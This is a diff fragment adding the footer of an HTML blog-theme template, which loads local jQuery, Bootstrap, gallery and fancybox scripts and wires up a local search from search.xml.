+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
